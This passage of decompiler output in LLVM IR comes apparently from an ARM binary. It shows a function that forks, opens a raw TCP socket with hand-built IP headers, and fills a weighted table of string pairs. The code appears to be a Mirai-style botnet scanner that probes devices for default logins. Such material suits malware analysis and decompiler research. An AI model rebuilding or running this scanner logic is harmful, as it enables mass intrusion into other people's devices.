  uselistorder i32 %v3_11504, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 34, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32 (i8*)* @function_13a54, { 27, 28, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32* (i32*, i32)* @realloc, { 4, 3, 5, 0, 1, 10, 11, 6, 2, 8, 7, 9, 12 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_11694() local_unnamed_addr {
dec_label_pc_11694:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp240 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11694 = load i32, i32* @r4, align 4
  store i32 %v3_11694, i32* %stack_var_-36, align 4
  %v6_11694 = load i32, i32* @r5, align 4
  %v9_11694 = load i32, i32* @r6, align 4
  %v12_11694 = load i32, i32* @r7, align 4
  %v15_11694 = load i32, i32* @r8, align 4
  %v18_11694 = load i32, i32* @sb, align 4
  %v21_11694 = load i32, i32* @sl, align 4
  %v24_11694 = load i32, i32* @fp, align 4
  %v0_1169c = call i32 @fork()
  store i32 %v0_1169c, i32* %r0.global-to-local, align 4
  %v7_116a0 = icmp eq i32 %v0_1169c, -1
  %. = zext i1 %v7_116a0 to i32
  %tmp274 = icmp slt i32 %v0_1169c, 1
  %storemerge230 = select i1 %tmp274, i32 %., i32 1
  store i32 %storemerge230, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1ce18.238 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116bc = icmp eq i32 %storemerge230, 0
  store i1 %v2_116bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1169c, i32* @global_var_1ce18.238, align 4
  br i1 %v2_116bc, label %dec_label_pc_116d0, label %dec_label_pc_116c8

dec_label_pc_116c8:                               ; preds = %dec_label_pc_11694
  store i32 %v3_11694, i32* @r4, align 4
  store i32 %v6_11694, i32* %r5.global-to-local, align 4
  store i32 %v9_11694, i32* @r6, align 4
  store i32 %v12_11694, i32* @r7, align 4
  store i32 %v15_11694, i32* @r8, align 4
  store i32 %v18_11694, i32* @sb, align 4
  store i32 %v21_11694, i32* @sl, align 4
  store i32 %v24_11694, i32* @fp, align 4
  ret i32 %v0_1169c

dec_label_pc_116d0:                               ; preds = %dec_label_pc_11694
  %v0_116d0 = call i32 @function_13d0c()
  store i32 %v0_116d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdf4.141 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_116d0, i32* @global_var_1cdf4.141, align 4
  %v1_116dc = call i32 @function_10c30(i32 %v0_116d0)
  %v0_116e0 = load i32, i32* @r4, align 4
  store i32 %v0_116e0, i32* %r0.global-to-local, align 4
  %v1_116e4 = inttoptr i32 %v0_116e0 to i32*
  %v2_116e4 = call i32 @time(i32* %v1_116e4)
  store i32 ptrtoint (i32* @global_var_1cdf0.240 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_116e4, i32* @global_var_1cdf0.240, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_116f8 = call i32 @_calloc(i32 256, i32 288)
  store i32 %v2_116f8, i32* %lr.global-to-local, align 4
  %v0_11704 = load i32, i32* @r4, align 4
  store i32 %v0_11704, i32* %stack_var_-52, align 4
  store i32 %v2_116f8, i32* @global_var_1ce10.252, align 4
  store i32 %v0_11704, i32* %r3.global-to-local, align 4
  store i32 %v0_11704, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_11704, i32* %ip.global-to-local, align 4
  %v1_1171c = add i32 %v2_116f8, 4
  store i32 %v1_1171c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11720

dec_label_pc_11720:                               ; preds = %dec_label_pc_11720.dec_label_pc_11720_crit_edge, %dec_label_pc_116d0
  %v0_11738 = phi i32 [ %v0_11738.pre, %dec_label_pc_11720.dec_label_pc_11720_crit_edge ], [ %v0_11704, %dec_label_pc_116d0 ]
  %v0_11728 = phi i32 [ %v0_11740, %dec_label_pc_11720.dec_label_pc_11720_crit_edge ], [ %v0_11704, %dec_label_pc_116d0 ]
  %v1_11730 = phi i32 [ %v1_11730.pre, %dec_label_pc_11720.dec_label_pc_11720_crit_edge ], [ %v2_116f8, %dec_label_pc_116d0 ]
  %v3_11720 = mul i32 %v0_11728, 256
  store i32 %v3_11720, i32* %r2.global-to-local, align 4
  %v1_11728 = add i32 %v0_11728, 1
  store i32 %v1_11728, i32* %ip.global-to-local, align 4
  %v2_1172c = mul i32 %v0_11728, 288
  %v2_11730 = add i32 %v1_11730, 12
  %v2_11738 = add i32 %v2_11730, %v2_1172c
  %v3_11738 = inttoptr i32 %v2_11738 to i32*
  store i32 %v0_11738, i32* %v3_11738, align 4
  %v0_1173c = load i32, i32* %r0.global-to-local, align 4
  %v1_1173c = load i32, i32* %r1.global-to-local, align 4
  %v2_1173c = inttoptr i32 %v1_1173c to i32*
  store i32 %v0_1173c, i32* %v2_1173c, align 4
  %v3_1173c = load i32, i32* %r1.global-to-local, align 4
  %v4_1173c = add i32 %v3_1173c, 288
  store i32 %v4_1173c, i32* %r1.global-to-local, align 4
  %v0_11740 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_11740, i32* %r3.global-to-local, align 4
  %v7_11744 = icmp sgt i32 %v1_11728, 255
  br i1 %v7_11744, label %dec_label_pc_11748, label %dec_label_pc_11720.dec_label_pc_11720_crit_edge

dec_label_pc_11720.dec_label_pc_11720_crit_edge:  ; preds = %dec_label_pc_11720
  %v1_11730.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_11738.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11720

dec_label_pc_11748:                               ; preds = %dec_label_pc_11720
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_11740, i32* %stack_var_-52, align 4
  %v3_11758 = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_11758, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ce14.254 to i32), i32* %lr.global-to-local, align 4
  %v2_11760 = icmp eq i32 %v3_11758, -1
  store i1 %v2_11760, i1* %cpsr_c.global-to-local, align 1
  %v7_11760 = icmp eq i32 %v3_11758, -1
  store i1 %v7_11760, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_11758, i32* @r4, align 4
  store i32 %v3_11758, i32* @global_var_1ce14.254, align 4
  br i1 %v7_11760, label %dec_label_pc_12138, label %dec_label_pc_11770

dec_label_pc_11770:                               ; preds = %dec_label_pc_11748
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_11774 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11774, i32* %r2.global-to-local, align 4
  %v2_11778 = call i32 (i32, i32, ...) @fcntl(i32 %v3_11758, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_11780 = or i32 %v2_11778, 2048
  store i32 %v1_11780, i32* %r2.global-to-local, align 4
  %v0_11784 = load i32, i32* @r4, align 4
  store i32 %v0_11784, i32* %r0.global-to-local, align 4
  %v2_11788 = call i32 (i32, i32, ...) @fcntl(i32 %v0_11784, i32 4)
  store i32 1, i32* %ip.global-to-local, align 4
  %v2_11794 = load i32, i32* @global_var_1ce14.254, align 4
  store i32 %v2_11794, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_1179c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1179c, i32* %r1.global-to-local, align 4
  %v2_117a0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_117a0, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v0_117b0 = call i32 @_setsockopt()
  store i32 %v0_117b0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_117b4 = icmp eq i32 %v0_117b0, 0
  store i1 %v2_117b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117b4, label %dec_label_pc_117bc, label %dec_label_pc_1212c

dec_label_pc_117bc:                               ; preds = %dec_label_pc_11770, %dec_label_pc_117bc
  %v0_117bc = call i32 @function_10bd8()
  %v3_117c0 = mul i32 %v0_117bc, 65536
  store i32 %v3_117c0, i32* %r0.global-to-local, align 4
  %v1_117cc = mul i32 %v0_117bc, 256
  %v3_117d0 = and i32 %v1_117cc, 65280
  %tmp277 = udiv i32 %v0_117bc, 256
  %v4_117d4 = urem i32 %tmp277, 256
  %v5_117d4 = or i32 %v4_117d4, %v3_117d0
  store i32 %v5_117d4, i32* %r3.global-to-local, align 4
  %v2_117d8 = icmp ugt i32 %v5_117d4, 1023
  store i1 %v2_117d8, i1* %cpsr_c.global-to-local, align 1
  %v7_117d8 = icmp eq i32 %v5_117d4, 1024
  store i1 %v7_117d8, i1* %cpsr_z.global-to-local, align 1
  %v3_117dc = icmp ult i32 %v5_117d4, 1022
  br i1 %v3_117dc, label %dec_label_pc_117bc, label %dec_label_pc_117e0

dec_label_pc_117e0:                               ; preds = %dec_label_pc_117bc
  %v5_117c8.le = trunc i32 %v0_117bc to i8
  store i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i8 69, i8* bitcast (i32* @global_var_1cdc0.256 to i8*), align 4
  store i8 40, i8* bitcast (i32* @global_var_1cdc3.257 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1cdc2.258 to i8*), align 4
  %v0_11814 = call i32 @function_10bd8()
  %v1_11814 = trunc i32 %v0_11814 to i8
  store i32 %v0_11814, i32* %r0.global-to-local, align 4
  %v4_1181c = sext i8 %v5_117c8.le to i32
  %v3_11820 = load i8, i8* @global_var_1cde0.261, align 1
  store i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32* %lr.global-to-local, align 4
  %v3_11828229 = udiv i32 %v4_1181c, 256
  store i8 64, i8* bitcast (i32* @global_var_1cdc8.262 to i8*), align 4
  %v2_11834 = and i32 %v0_11814, 128
  %v3_11834 = icmp ne i32 %v2_11834, 0
  store i1 %v3_11834, i1* %cpsr_c.global-to-local, align 1
  %v4_11834228 = udiv i32 %v0_11814, 256
  store i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), i32* %r3.global-to-local, align 4
  %tmp = urem i8 %v3_11820, 16
  %v1_1183c = zext i8 %tmp to i32
  store i32 6, i32* @r6, align 4
  %v1_11844 = trunc i32 %v4_11834228 to i8
  store i8 %v1_11844, i8* bitcast (i32* @global_var_1cdc5.263 to i8*), align 4
  %v1_11848 = or i32 %v1_1183c, 80
  store i32 %v1_11848, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  %v1_11850 = trunc i32 %v1_11848 to i8
  store i8 %v1_11850, i8* @global_var_1cde0.261, align 1
  %v1_11854 = trunc i32 %v3_11828229 to i8
  store i8 %v1_11854, i8* bitcast (i32* @global_var_1cdd5.264 to i8*), align 4
  store i8 23, i8* bitcast (i32* @global_var_1cdd7.265 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1cdc9.266 to i8*), align 4
  store i32 %v4_1181c, i32* %ip.global-to-local, align 4
  store i8 %v1_11814, i8* bitcast (i32* @global_var_1cdc4.267 to i8*), align 4
  store i8 %v5_117c8.le, i8* bitcast (i32* @global_var_1cdd4.260 to i8*), align 4
  %v0_1186c = load i32, i32* @r5, align 4
  %v1_1186c = trunc i32 %v0_1186c to i8
  store i8 %v1_1186c, i8* bitcast (i32* @global_var_1cdd6.268 to i8*), align 4
  %v0_11870 = call i32 @function_10bd8()
  %v1_11870 = trunc i32 %v0_11870 to i8
  store i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), i32* %lr.global-to-local, align 4
  %v3_11878 = load i8, i8* @global_var_1cde1.269, align 1
  %v4_11878 = zext i8 %v3_11878 to i32
  %v2_1187c = and i32 %v0_11870, 128
  %v3_1187c = icmp ne i32 %v2_1187c, 0
  store i1 %v3_1187c, i1* %cpsr_c.global-to-local, align 1
  %v4_1187c = sdiv i32 %v0_11870, 256
  store i32 %v4_1187c, i32* %ip.global-to-local, align 4
  %v1_11880 = or i32 %v4_11878, 2
  store i32 %v1_11880, i32* %r3.global-to-local, align 4
  %v1_11888 = trunc i32 %v4_1187c to i8
  store i8 %v1_11888, i8* bitcast (i32* @global_var_1cde3.270 to i8*), align 4
  %v1_1188c = trunc i32 %v1_11880 to i8
  store i8 %v1_1188c, i8* @global_var_1cde1.269, align 1
  store i8 %v1_11870, i8* bitcast (i32* @global_var_1cde2.271 to i8*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_118a0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_118b0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1449c.279 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_118c0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_1449c.279 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_144a4.281 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_118d0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint ([6 x i8]* @global_var_144a4.281 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_118e0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r1.global-to-local, align 4
  %v5_118f0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144ac.283 to i32), i32* %r1.global-to-local, align 4
  %v0_118fc = load i32, i32* @r6, align 4
  store i32 %v0_118fc, i32* %r2.global-to-local, align 4
  %v4_11900 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_144ac.283 to i32), i32 %v0_118fc)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_144b4.285 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_11910 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint ([8 x i8]* @global_var_144b4.285 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_144bc.287 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_11920 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint ([9 x i8]* @global_var_144bc.287 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_11930 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144d0.291 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_11940 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_144d0.291 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_144d8.293 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_11950 = call i32 @function_114f0(i32 ptrtoint ([8 x i8]* @global_var_144d8.293 to i32), i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32* %r1.global-to-local, align 4
  %v5_11960 = call i32 @function_114f0(i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_11970 = call i32 @function_114f0(i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144e8.297 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_11980 = call i32 @function_114f0(i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32 ptrtoint (i32* @global_var_144e8.297 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_11990 = call i32 @function_114f0(i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_119a0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_144f0.299 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_119b0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint ([9 x i8]* @global_var_144f0.299 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r1.global-to-local, align 4
  %v5_119c0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144fc.301 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_119d0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_144fc.301 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_14504.303 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_119e0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_14504.303 to i32), i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_14504.303 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14504.303 to i32), i32* %r1.global-to-local, align 4
  %v5_119f0 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_14504.303 to i32), i32 ptrtoint ([5 x i8]* @global_var_14504.303 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_14504.303 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32* %r1.global-to-local, align 4
  %v0_119fc = load i32, i32* @r6, align 4
  store i32 %v0_119fc, i32* %r2.global-to-local, align 4
  %v4_11a00 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_14504.303 to i32), i32 ptrtoint (i32* @global_var_144c8.289 to i32), i32 %v0_119fc)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1450c.305 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_11a10 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_1450c.305 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145b0.307 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_11a20 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_145b0.307 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14518.309 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_11a30 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint ([9 x i8]* @global_var_14518.309 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145b0.307 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_11a40 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint (i32* @global_var_145b0.307 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14524.311 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_11a50 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_14524.311 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_144f0.299 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_11a60 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint ([9 x i8]* @global_var_144f0.299 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144e8.297 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_11a70 = call i32 @function_114f0(i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), i32 ptrtoint (i32* @global_var_144e8.297 to i32), i32 4)
  store i32 ptrtoint ([14 x i8]* @global_var_1452c.313 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_11a80 = call i32 @function_114f0(i32 ptrtoint ([14 x i8]* @global_var_1452c.313 to i32), i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1453c.315 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_11a90 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), i32 ptrtoint ([8 x i8]* @global_var_1453c.315 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_11aa0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32 ptrtoint (i32* @global_var_143d0.275 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32* %r1.global-to-local, align 4
  %v5_11ab0 = call i32 @function_114f0(i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144fc.301 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
